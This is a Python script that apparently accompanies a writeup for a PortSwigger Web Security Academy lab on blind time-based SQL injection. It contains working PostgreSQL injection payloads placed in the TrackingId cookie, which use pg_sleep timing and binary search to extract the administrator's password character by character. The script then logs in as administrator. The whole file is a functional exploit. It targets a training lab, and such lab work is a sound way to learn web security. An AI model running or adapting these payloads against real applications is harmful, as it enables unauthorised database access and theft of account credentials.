#!/usr/bin/env python3
"""
Blind SQL injection with time delays and information retrieval
PortSwigger Web Security Academy -- SQL Injection

Companion script for the writeup: 15-blind-time-delays-info-retrieval.md

What this does:
    Extracts the administrator password purely through response timing.
    Stacked queries are disabled on this lab's PostgreSQL driver, so the delay
    is forced inside a single statement via a CASE WHEN ... pg_sleep()
    subquery wrapped in "IS NULL", which makes PostgreSQL evaluate it even
    though the comparison itself is meaningless. Runs strictly sequentially --
    concurrent timing requests would corrupt each other's measurements.

Usage:
    python 15-blind-time-delays-info-retrieval.py <lab-url>

Requirements:
    pip install httpx
"""

import re
import sys
import time
import httpx

DELAY = 2.0


def timed_request(client: httpx.Client, lab_url: str, session: str, suffix: str) -> bool:
    cookie = f"TrackingId={suffix}; session={session}"
    t0 = time.time()
    try:
        client.get(lab_url, headers={"Cookie": cookie})
    except httpx.ReadTimeout:
        pass
    return (time.time() - t0) >= (DELAY - 0.8)


def len_suffix(length: int) -> str:
    return (
        f"' AND (SELECT CASE WHEN (LENGTH(password)={length}) "
        f"THEN pg_sleep({DELAY}) ELSE pg_sleep(0) END "
        f"FROM users WHERE username='administrator') IS NULL-- "
    )


def char_suffix(pos: int, mid: int) -> str:
    return (
        f"' AND (SELECT CASE WHEN (ASCII(SUBSTRING(password,{pos},1))>{mid}) "
        f"THEN pg_sleep({DELAY}) ELSE pg_sleep(0) END "
        f"FROM users WHERE username='administrator') IS NULL-- "
    )


def get_csrf(client: httpx.Client, url: str) -> str:
    r = client.get(url)
    m = re.search(r'name="csrf"\s+value="([^"]+)"', r.text)
    return m.group(1) if m else ""


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=DELAY + 10)
    seed = client.get(lab_url)
    session = seed.cookies.get("session", "")

    length = 0
    for l in range(1, 100):
        if timed_request(client, lab_url, session, len_suffix(l)):
            length = l
            break
    if not length:
        print("[-] Could not determine password length.")
        return
    print(f"[+] Password length: {length}")

    password = ""
    for pos in range(1, length + 1):
        lo, hi = 32, 126
        while lo <= hi:
            mid = (lo + hi) // 2
            if timed_request(client, lab_url, session, char_suffix(pos, mid)):
                lo = mid + 1
            else:
                hi = mid - 1
        password += chr(lo)
        print(f"[*] Progress: {password}", end="\r")

    print(f"\n[+] administrator's password: {password}")

    csrf = get_csrf(client, f"{lab_url}/login")
    login = client.post(f"{lab_url}/login", data={"username": "administrator", "password": password, "csrf": csrf})
    if "Log out" in login.text or "/my-account" in str(login.url):
        print("[+] Logged in as administrator. Lab solved.")
    else:
        print("[-] Login did not succeed with the extracted password.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
